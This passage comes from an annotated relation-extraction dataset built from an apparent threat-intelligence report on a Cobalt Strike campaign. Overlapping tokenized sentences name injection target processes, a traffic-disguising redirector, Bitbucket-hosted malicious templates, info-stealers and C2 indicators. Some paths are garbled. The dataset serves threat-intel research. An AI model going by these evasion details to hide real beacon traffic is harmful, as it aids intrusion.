"traffic", "and", "evade", "network", "detections", "."], ["Also", ",", "with", "its", "capabilities", "to", "configure", "commands", "in", "the", "beacon", "configuration", ",", "the", "attacker", "can", "perform", "various", "malicious", "operations", "such", "as", "injecting", "other", "malicious", "binary", "into", "the", "running", "processes", "of", "the", "infected", "machines", "and", "can", "avoid", "having", "a", "separate", "injection", "module", "implants", "in", "their", "infection", "chain", "."], ["The", "Cobalt", "Strike", "beacon", "configurations", "of", "this", "campaign", "showed", "us", "various", "characteristics", "of", "the", "beacon", "binary", ":", "C2", "server", "."], ["Target", "process", "to", "spawn", "for", "x86", "and", "x64", "processes", "."], ["The", "Cobalt", "Strike", "beacon", "used", "in", "this", "campaign", "has", "the", "following", "capabilities", ":", "Executes", "arbitrary", "codes", "in", "the", "target", "processes", "through", "process", "injection", "."], ["Target", "processes", "described", "in", "the", "beacon", "configuration", "related", "to", "this", "campaign", "include", ":", "x86", ":", "''", "%", "windir", "%", "\\syswow64\\dns-sd.exe", "''", "''", "%", "windir", "%", "\\syswow64", "undll32.exe", "''", "''", "%", "windir", "%", "\\syswow64\\dllhost.exe", "-o", "enable", "''", "x64", ":", "''", "%", "windir", "%", "\\sysnative\\getmac.exe", "/V", "''", "''", "%", "windir", "%", "\\sysnative", "undll32.exe", "''", "''", "%", "windir", "%", "\\sysnative\\DeviceParingWizard.exe", "''", "A", "high-reputation", "domain", "defined", "in", "the", "HostHeader", "component", "of", "the", "beacon", "configuration", "."], ["The", "actor", "is", "using", "this", "redirector", "technique", "to", "make", "the", "beacon", "traffic", "appear", "legitimate", "and", "avoid", "detection", "."], ["Malicious", "repositoryThe", "attacker", "in", "this", "campaign", "has", "hosted", "malicious", "DOTM", "templates", "and", "Cobalt", "Strike", "DLLs", "on", "Bitbucket", "using", "different", "accounts", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "Cobalt Strike", "pos": [1, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "attackers", "pos": [12, 13], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [40, 40], "name": "attacker", "pos": [14, 15], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [75, 75], "name": "Cobalt Strike beacon", "pos": [1, 4], "index": "3_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [105, 105], "name": "Cobalt Strike beacon", "pos": [1, 4], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [119, 119], "name": "codes", "pos": [15, 16], "index": "5_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [123, 123], "name": "processes", "pos": [19, 20], "index": "6_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [129, 129], "name": "processes", "pos": [1, 2], "index": "7_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [144, 144], "name": "% windir % \\syswow64\\dns-sd.exe", "pos": [16, 20], "index": "8_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [150, 150], "name": "% windir % \\syswow64 undll32.exe", "pos": [22, 27], "index": "9_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [157, 157], "name": "% windir % \\syswow64\\dllhost.exe", "pos": [29, 33], "index": "10_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [167, 167], "name": "% windir % \\sysnative\\getmac.exe", "pos": [39, 43], "index": "11_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [174, 174], "name": "% windir % \\sysnative undll32.exe", "pos": [46, 51], "index": "12_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [181, 181], "name": "% windir % \\sysnative\\DeviceParingWizard.exe", "pos": [53, 57], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [219, 219], "name": "attacker", "pos": [2, 3], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [226, 226], "name": "DOTM templates", "pos": [9, 11], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [229, 229], "name": "Cobalt Strike DLLs", "pos": [12, 15], "index": "16_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [0, 1, 2, 3, 4], "h": 1, "t": 6}, {"r": "WR", "evidence": [0, 1], "t": 0, "h": 2}, {"r": "WR", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "CO", "evidence": [2, 3, 4], "h": 3, "t": 4}, {"r": "IJ", "evidence": [4], "h": 4, "t": 6}, {"r": "EX", "evidence": [4], "t": 5, "h": 6}, {"r": "UK", "evidence": [4, 5, 6, 7], "h": 4, "t": 15}, {"r": "CO", "evidence": [4, 5], "h": 6, "t": 7}, {"r": "CO", "evidence": [4, 5], "h": 6, "t": 8}, {"r": "WR", "evidence": [4, 5], "t": 5, "h": 9}, {"r": "FR", "evidence": [5, 6, 7], "h": 9, "t": 14}, {"r": "WR", "evidence": [4, 5], "t": 5, "h": 10}, {"r": "WR", "evidence": [4, 5], "t": 5, "h": 11}, {"r": "WR", "evidence": [4, 5], "t": 5, "h": 12}, {"r": "WR", "evidence": [4, 5], "t": 5, "h": 13}]}, {"title": "063-35", "sents": [["Also", ",", "with", "its", "capabilities", "to", "configure", "commands", "in", "the", "beacon", "configuration", ",", "the", "attacker", "can", "perform", "various", "malicious", "operations", "such", "as", "injecting", "other", "malicious", "binary", "into", "the", "running", "processes", "of", "the", "infected", "machines", "and", "can", "avoid", "having", "a", "separate", "injection", "module", "implants", "in", "their", "infection", "chain", "."], ["The", "Cobalt", "Strike", "beacon", "configurations", "of", "this", "campaign", "showed", "us", "various", "characteristics", "of", "the", "beacon", "binary", ":", "C2", "server", "."], ["Target", "process", "to", "spawn", "for", "x86", "and", "x64", "processes", "."], ["The", "Cobalt", "Strike", "beacon", "used", "in", "this", "campaign", "has", "the", "following", "capabilities", ":", "Executes", "arbitrary", "codes", "in", "the", "target", "processes", "through", "process", "injection", "."], ["Target", "processes", "described", "in", "the", "beacon", "configuration", "related", "to", "this", "campaign", "include", ":", "x86", ":", "''", "%", "windir", "%", "\\syswow64\\dns-sd.exe", "''", "''", "%", "windir", "%", "\\syswow64", "undll32.exe", "''", "''", "%", "windir", "%", "\\syswow64\\dllhost.exe", "-o", "enable", "''", "x64", ":", "''", "%", "windir", "%", "\\sysnative\\getmac.exe", "/V", "''", "''", "%", "windir", "%", "\\sysnative", "undll32.exe", "''", "''", "%", "windir", "%", "\\sysnative\\DeviceParingWizard.exe", "''", "A", "high-reputation", "domain", "defined", "in", "the", "HostHeader", "component", "of", "the", "beacon", "configuration", "."], ["The", "actor", "is", "using", "this", "redirector", "technique", "to", "make", "the", "beacon", "traffic", "appear", "legitimate", "and", "avoid", "detection", "."], ["Malicious", "repositoryThe", "attacker", "in", "this", "campaign", "has", "hosted", "malicious", "DOTM", "templates", "and", "Cobalt", "Strike", "DLLs", "on", "Bitbucket", "using", "different", "accounts", "."], ["Talos", "also", "discovered", "in", "VirusTotal", "that", "the", "attacker", "operated", "the", "Bitbucket", "account", "``", "clouchfair", ",", "''", "using", "the", "account", "to", "host", "two", "other", "information", "stealer", "executables", ",", "Redline", "and", "Amadey", ",", "along", "with", "a", "malicious", "DOTM", "template", "and", "Cobalt", "Strike", "DLL", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [14, 14], "name": "attacker", "pos": [14, 15], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [49, 49], "name": "Cobalt Strike beacon", "pos": [1, 4], "index": "1_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [79, 79], "name": "Cobalt Strike beacon", "pos": [1, 4], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [93, 93], "name": "codes", "pos": [15, 16], "index": "3_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [97, 97], "name": "processes", "pos": [19, 20], "index": "4_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [103, 103], "name": "processes", "pos": [1, 2], "index": "5_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [118, 118], "name": "% windir % \\syswow64\\dns-sd.exe", "pos": [16, 20], "index": "6_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [124, 124], "name": "% windir % \\syswow64 undll32.exe", "pos": [22, 27], "index": "7_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [131, 131], "name": "% windir % \\syswow64\\dllhost.exe", "pos": [29, 33], "index": "8_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [141, 141], "name": "% windir % \\sysnative\\getmac.exe", "pos": [39, 43], "index": "9_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [148, 148], "name": "% windir % \\sysnative undll32.exe", "pos": [46, 51], "index": "10_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [155, 155], "name": "% windir % \\sysnative\\DeviceParingWizard.exe", "pos": [53, 57], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [193, 193], "name": "attacker", "pos": [2, 3], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [200, 200], "name": "DOTM templates", "pos": [9, 11], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [203, 203], "name": "Cobalt Strike DLLs", "pos": [12, 15], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [219, 219], "name": "attacker", "pos": [7, 8], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [239, 239], "name": "Redline", "pos": [27, 28], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [241, 241], "name": "Amadey", "pos": [29, 30], "index": "17_0"}]], "labels": [{"r": "CO", "evidence": [1, 2, 3], "h": 1, "t": 2}, {"r": "IJ", "evidence": [3], "h": 2, "t": 4}, {"r": "EX", "evidence": [3], "t": 3, "h": 4}, {"r": "UK", "evidence": [3, 4, 5, 6], "h": 2, "t": 13}, {"r": "CO", "evidence": [3, 4], "h": 4, "t": 5}, {"r": "CO", "evidence": [3, 4], "h": 4, "t": 6}, {"r": "WR", "evidence": [3, 4], "t": 3, "h": 7}, {"r": "FR", "evidence": [4, 5, 6], "h": 7, "t": 12}, {"r": "WR", "evidence": [3, 4], "t": 3, "h": 8}, {"r": "WR", "evidence": [3, 4], "t": 3, "h": 9}, {"r": "WR", "evidence": [3, 4], "t": 3, "h": 10}, {"r": "WR", "evidence": [3, 4], "t": 3, "h": 11}]}, {"title": "063-36", "sents": [["The", "Cobalt", "Strike", "beacon", "configurations", "of", "this", "campaign", "showed", "us", "various", "characteristics", "of", "the", "beacon", "binary", ":", "C2", "server", "."], ["Target", "process", "to", "spawn", "for", "x86", "and", "x64", "processes", "."], ["The", "Cobalt", "Strike", "beacon", "used", "in", "this", "campaign", "has", "the", "following", "capabilities", ":", "Executes", "arbitrary", "codes", "in", "the", "target", "processes", "through", "process", "injection", "."], ["Target", "processes", "described", "in", "the", "beacon", "configuration", "related", "to", "this", "campaign", "include", ":", "x86", ":", "''", "%", "windir", "%", "\\syswow64\\dns-sd.exe", "''", "''", "%", "windir", "%", "\\syswow64", "undll32.exe", "''", "''", "%", "windir", "%", "\\syswow64\\dllhost.exe", "-o", "enable", "''", "x64", ":", "''", "%", "windir", "%", "\\sysnative\\getmac.exe", "/V", "''", "''", "%", "windir", "%", "\\sysnative", "undll32.exe", "''", "''", "%", "windir", "%", "\\sysnative\\DeviceParingWizard.exe", "''", "A", "high-reputation", "domain", "defined", "in", "the", "HostHeader", "component", "of", "the", "beacon", "configuration", "."], ["The", "actor", "is", "using", "this", "redirector", "technique", "to", "make", "the", "beacon", "traffic", "appear", "legitimate", "and", "avoid", "detection", "."], ["Malicious", "repositoryThe", "attacker", "in", "this", "campaign", "has", "hosted", "malicious", "DOTM", "templates", "and", "Cobalt", "Strike", "DLLs", "on", "Bitbucket", "using", "different", "accounts", "."], ["Talos", "also", "discovered", "in", "VirusTotal", "that", "the", "attacker", "operated", "the", "Bitbucket", "account", "``", "clouchfair", ",", "''", "using", "the", "account", "to", "host", "two", "other", "information", "stealer", "executables", ",", "Redline", "and", "Amadey", ",", "along", "with", "a", "malicious", "DOTM", "template", "and", "Cobalt", "Strike", "DLL", "."], ["Command", "and", "controlTalos", "discovered", "the", "C2", "server", "operated", "in", "this", "campaign", "with", "the", "IP", "address", "185", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "Cobalt Strike beacon", "pos": [1, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [31, 31], "name": "Cobalt Strike beacon", "pos": [1, 4], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [45, 45], "name": "codes", "pos": [15, 16], "index": "2_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [49, 49], "name": "processes", "pos": [19, 20], "index": "3_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [55, 55], "name": "processes", "pos": [1, 2], "index": "4_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [70, 70], "name": "% windir % \\syswow64\\dns-sd.exe", "pos": [16, 20], "index": "5_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [76, 76], "name": "% windir % \\syswow64 undll32.exe", "pos": [22, 27], "index": "6_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [83, 83], "name": "% windir % \\syswow64\\dllhost.exe", "pos": [29, 33], "index": "7_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [93, 93], "name": "% windir % \\sysnative\\getmac.exe", "pos": [39, 43], "index": "8_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [100, 100], "name": "% windir % \\sysnative undll32.exe", "pos": [46, 51], "index": "9_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [107, 107], "name": "% windir % \\sysnative\\DeviceParingWizard.exe", "pos": [53, 57], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [145, 145], "name": "attacker", "pos": [2, 3], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [152, 152], "name": "DOTM templates", "pos": [9, 11], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [155, 155], "name": "Cobalt Strike DLLs", "pos": [12, 15], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [171, 171], "name": "attacker", "pos": [7, 8], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [191, 191], "name": "Redline", "pos": [27, 28], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [193, 193], "name": "Amadey", "pos": [29, 30], "index": "16_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [211, 211], "name": "C2 server", "pos": [5, 7], "index": "17_0"}]], "labels": [{"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 1}, {"r": "IJ", "evidence": [2], "h": 1, "t": 3}, {"r": "EX", "evidence": [2], "t": 2, "h": 3}, {"r": "UK", "evidence": [2, 3, 4, 5], "h": 1, "t": 12}, {"r": "CO", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "CO", "evidence": [2, 3], "h": 3, "t": 5}, {"r": "WR", "evidence": [2, 3], "t": 2, "h": 6}, {"r": "FR", "evidence": [3, 4, 5], "h": 6, "t": 11}, {"r": "WR", "evidence": [2, 3], "t": 2, "h": 7}, {"r": "WR", "evidence": [2, 3], "t": 2, "h": 8}, {"r": "WR", "evidence": [2, 3], "t": 2, "h": 9}, {"r": "WR", "evidence": [2, 3], "t": 2, "h": 10}]}, {"title": "063-37", "sents": [["Target", "process", "to", "spawn", "for", "x86", "and", "x64", "processes", "."], ["The", "Cobalt", "Strike", "beacon", "used", "in", "this", "campaign", "has", "the", "following", "capabilities", ":", "Executes", "arbitrary", "codes", "in", "the", "target", "processes", "through", "process", "injection", "."], ["Target", "processes", "described", "in", "the", "beacon", "configuration", "related", "to", "this", "campaign", "include", ":", "x86", ":", "''", "%", "windir", "%", "\\syswow64\\dns-sd.exe", "''", "''", "%", "windir", "%", "\\syswow64", "undll32.exe", "''", "''", "%", "windir", "%", "\\syswow64\\dllhost.exe", "-o", "enable", "''", "x64", ":", "''", "%", "windir", "%", "\\sysnative\\getmac.exe", "/V", "''", "''", "%", "windir", "%", "\\sysnative", "undll32.exe", "''", "''", "%", "windir", "%", "\\sysnative\\DeviceParingWizard.exe", "''", "A", "high-reputation", "domain", "defined", "in", "the", "HostHeader", "component", "of", "the", "beacon", "configuration", "."], ["The", "actor", "is", "using", "this", "redirector", "technique", "to", "make", "the", "beacon", "traffic", "appear", "legitimate", "and", "avoid", "detection", "."], ["Malicious", "repositoryThe", "attacker", "in", "this", "campaign", "has", "hosted", "malicious", "DOTM", "templates", "and", "Cobalt", "Strike", "DLLs", "on", "Bitbucket", "using", "different", "accounts", "."], ["Talos", "also", "discovered", "in", "VirusTotal", "that", "the", "attacker", "operated", "the", "Bitbucket", "account", "``", "clouchfair", ",", "''", "using", "the", "account", "to", "host", "two", "other", "information", "stealer", "executables", ",", "Redline", "and", "Amadey", ",", "along", "with", "a", "malicious", "DOTM", "template", "and", "Cobalt", "Strike", "DLL", "."], ["Command", "and", "controlTalos", "discovered", "the", "C2", "server", "operated", "in", "this", "campaign", "with", "the", "IP", "address", "185", "."], ["Shodan", "search", "results", "showed", "us", "that", "the", "C2", "server", "contained", "two", "self-signed", "SSL", "certificates", "with", "the", "serial", "numbers", "6532815796879806872", "and", "1657766544761773100", ",", "which", "are", "valid", "from", "July", "14", ",", "2022", "-", "July", "14", ",", "2023", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [11, 11], "name": "Cobalt Strike beacon", "pos": [1, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [25, 25], "name": "codes", "pos": [15, 16], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [29, 29], "name": "processes", "pos": [19, 20], "index": "2_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [35, 35], "name": "processes", "pos": [1, 2], "index": "3_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [50, 50], "name": "% windir % \\syswow64\\dns-sd.exe", "pos": [16, 20], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [56, 56], "name": "% windir % \\syswow64 undll32.exe", "pos": [22, 27], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [63, 63], "name": "% windir % \\syswow64\\dllhost.exe", "pos": [29, 33], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [73, 73], "name": "% windir % \\sysnative\\getmac.exe", "pos": [39, 43], "index": "7_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [80, 80], "name": "% windir % \\sysnative undll32.exe", "pos": [46, 51], "index": "8_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [87, 87], "name": "% windir % \\sysnative\\DeviceParingWizard.exe", "pos": [53, 57], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [125, 125], "name": "attacker", "pos": [2, 3], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [132, 132], "name": "DOTM templates", "pos": [9, 11], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [135, 135], "name": "Cobalt Strike DLLs", "pos": [12, 15], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [151, 151], "name": "attacker", "pos": [7, 8], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [171, 171], "name": "Redline", "pos": [27, 28], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [173, 173], "name": "Amadey", "pos": [29, 30], "index": "15_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [191, 191], "name": "C2 server", "pos": [5, 7], "index": "16_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [210, 210], "name": "C2 server", "pos": [7, 9], "index": "17_0"}]], "labels": [{"r": "IJ", "evidence": [1], "h": 0, "t": 2}, {"r": "EX", "evidence": [1], "t": 1, "h": 2}, {"r": "UK", "evidence": [1, 2, 3, 4], "h": 0, "t": 11}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "WR", "evidence": [1, 2], "t": 1, "h": 5}, {"r": "FR", "evidence": [2, 3, 4], "h": 5, "t": 10}, {"r": "WR", "evidence": [1, 2], "t": 1, "h": 6}, {"r": "WR", "evidence": [1, 2], "t": 1, "h": 7}, {"r": "WR", "evidence": [1, 2], "t": 1, "h": 8}, {"r": "WR", "evidence": [1, 2], "t": 1, "h": 9}]}, {"title": "063-38", "sents": [["The", "Cobalt", "Strike", "beacon", "used", "in", "this", "campaign", "has", "the", "following", "capabilities", ":", "Executes", "arbitrary", "codes", "in", "the", "target", "processes", "through", "process", "injection", "."], ["Target", "processes", "described", "in", "the", "beacon", "configuration", "related", "to", "this", "campaign", "include", ":", "x86", ":", "''", "%", "windir", "%", "\\syswow64\\dns-sd.exe", "''", "''", "%", "windir", "%", "\\syswow64", "undll32.exe", "''", "''", "%", "windir", "%", "\\syswow64\\dllhost.exe", "-o", "enable", "''", "x64", ":", "''", "%", "windir", "%", "\\sysnative\\getmac.exe", "/V", "''", "''", "%", "windir", "%", "\\sysnative", "undll32.exe", "''", "''", "%", "windir", "%", "\\sysnative\\DeviceParingWizard.exe", "''", "A", "high-reputation", "domain", "defined", "in", "the", "HostHeader", "component", "of", "the", "beacon", "configuration", "."], ["The", "actor", "is", "using", "this", "redirector", "technique", "to", "make", "the", "beacon", "traffic", "appear", "legitimate", "and", "avoid", "detection", "."], ["Malicious", "repositoryThe", "attacker", "in", "this", "campaign", "has", "hosted", "malicious", "DOTM", "templates", "and", "Cobalt", "Strike", "DLLs", "on", "Bitbucket", "using", "different", "accounts", "."], ["Talos", "also", "discovered", "in", "VirusTotal", "that", "the", "attacker", "operated", "the", "Bitbucket", "account", "``", "clouchfair", ",", "''", "using", "the", "account", "to", "host", "two", "other", "information", "stealer", "executables", ",", "Redline", "and", "Amadey", ",", "along", "with", "a", "malicious", "DOTM", "template", "and", "Cobalt", "Strike", "DLL", "."], ["Command", "and", "controlTalos", "discovered", "the", "C2", "server", "operated", "in", "this", "campaign", "with", "the", "IP", "address", "185", "."], ["Shodan", "search", "results", "showed", "us", "that", "the", "C2", "server", "contained", "two", "self-signed", "SSL", "certificates", "with", "the", "serial", "numbers", "6532815796879806872", "and", "1657766544761773100", ",", "which", "are", "valid", "from", "July", "14", ",", "2022", "-", "July", "14", ",", "2023", "."], ["SSL", "certificate", "associated", "with", "the", "C2", "servers", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "Cobalt Strike beacon", "pos": [1, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "codes", "pos": [15, 16], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [19, 19], "name": "processes", "pos": [19, 20], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [25, 25], "name": "processes", "pos": [1, 2], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [40, 40], "name": "% windir % \\syswow64\\dns-sd.exe", "pos": [16, 20], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [46, 46], "name": "% windir % \\syswow64 undll32.exe", "pos": [22, 27], "index": "5_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [53, 53], "name": "% windir % \\syswow64\\dllhost.exe", "pos": [29, 33], "index": "6_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [63, 63], "name": "% windir % \\sysnative\\getmac.exe", "pos": [39, 43], "index": "7_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [70, 70], "name": "% windir % \\sysnative undll32.exe", "pos": [46, 51], "index": "8_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [77, 77], "name": "% windir % \\sysnative\\DeviceParingWizard.exe", "pos": [53, 57], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [115, 115], "name": "attacker", "pos": [2, 3], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [122, 122], "name": "DOTM templates", "pos": [9, 11], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [125, 125], "name": "Cobalt Strike DLLs", "pos": [12, 15], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [141, 141], "name": "attacker", "pos": [7, 8], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [161, 161], "name": "Redline", "pos": [27, 28], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [163, 163], "name": "Amadey", "pos": [29, 30], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [181, 181], "name": "C2 server", "pos": [5, 7], "index": "16_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [200, 200], "name": "C2 server", "pos": [7, 9], "index": "17_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [234, 234], "name": "C2 servers", "pos": [5, 7], "index": "18_0"}]], "labels": [{"r": "IJ", "evidence": [0], "h": 0, "t": 2}, {"r": "EX", "evidence": [0], "t": 1, "h": 2}, {"r": "UK", "evidence": [0, 1, 2, 3], "h": 0, "t": 11}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 5}, {"r": "FR", "evidence": [1, 2, 3], "h": 5, "t": 10}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 6}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 7}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 8}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 9}]}, {"title": "063-39", "sents": [["Target", "processes", "described", "in", "the", "beacon", "configuration", "related", "to", "this", "campaign", "include", ":", "x86", ":", "''", "%", "windir", "%", "\\syswow64\\dns-sd.exe", "''", "''", "%", "windir", "%", "\\syswow64", "undll32.exe", "''", "''", "%", "windir", "%", "\\syswow64\\dllhost.exe", "-o", "enable", "''", "x64", ":", "''", "%", "windir", "%", "\\sysnative\\getmac.exe", "/V", "''", "''", "%", "windir", "%", "\\sysnative", "undll32.exe", "''", "''", "%", "windir", "%", "\\sysnative\\DeviceParingWizard.exe", "''", "A", "high-reputation", "domain", "defined", "in", "the", "HostHeader", "component", "of", "the", "beacon", "configuration", "."], ["The", "actor", "is", "using", "this", "redirector", "technique", "to", "make", "the", "beacon", "traffic", "appear", "legitimate", "and", "avoid", "detection", "."], ["Malicious", "repositoryThe", "attacker", "in", "this", "campaign", "has", "hosted", "malicious", "DOTM", "templates", "and", "Cobalt", "Strike", "DLLs", "on", "Bitbucket", "using", "different", "accounts", "."], ["Talos", "also", "discovered", "in", "VirusTotal", "that", "the", "attacker", "operated", "the", "Bitbucket", "account", "``", "clouchfair", ",", "''", "using", "the", "account", "to", "host", "two", "other", "information", "stealer", "executables", ",", "Redline", "and", "Amadey", ",", "along", "with", "a", "malicious", "DOTM", "template", "and", "Cobalt", "Strike", "DLL", "."], ["Command", "and", "controlTalos", "discovered", "the", "C2", "server", "operated", "in", "this", "campaign", "with", "the", "IP", "address", "185", "."], ["Shodan", "search", "results", "showed", "us", "that", "the", "C2", "server", "contained", "two", "self-signed", "SSL", "certificates", "with", "the", "serial", "numbers", "6532815796879806872", "and", "1657766544761773100", ",", "which", "are", "valid", "from", "July", "14", ",", "2022", "-", "July", "14", ",", "2023", "."], ["SSL", "certificate", "associated", "with", "the", "C2", "servers", "."], ["Pivoting", "on", "the", "SSL", "certificates", "disclosed", "another", "Cobalt", "Strike", "C2", "server", "with", "the", "IP", "address", "43.154.175.230"]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [1, 1], "name": "processes", "pos": [1, 2], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [16, 16], "name": "% windir % \\syswow64\\dns-sd.exe", "pos": [16, 20], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [22, 22], "name": "% windir % \\syswow64 undll32.exe", "pos": [22, 27], "index": "2_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [29, 29], "name": "% windir % \\syswow64\\dllhost.exe", "pos": [29, 33], "index": "3_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [39, 39], "name": "% windir % \\sysnative\\getmac.exe", "pos": [39, 43], "index": "4_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [46, 46], "name": "% windir % \\sysnative undll32.exe", "pos": [46, 51], "index": "5_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [53, 53], "name": "% windir % \\sysnative\\DeviceParingWizard.exe", "pos": [53, 57], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [91, 91], "name": "attacker", "pos": [2, 3], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [98, 98], "name": "DOTM templates", "pos": [9, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [101, 101], "name": "Cobalt Strike DLLs", "pos": [12, 15], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [117, 117], "name": "attacker", "pos": [7, 8], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [137, 137], "name": "Redline", "pos": [27, 28], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [139, 139], "name": "Amadey", "pos": [29, 30], "index": "12_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [157, 157], "name": "C2 server", "pos": [5, 7], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [176, 176], "name": "C2 server", "pos": [7, 9], "index": "14_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [210, 210], "name": "C2 servers", "pos": [5, 7], "index": "15_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [222, 222], "name": "C2 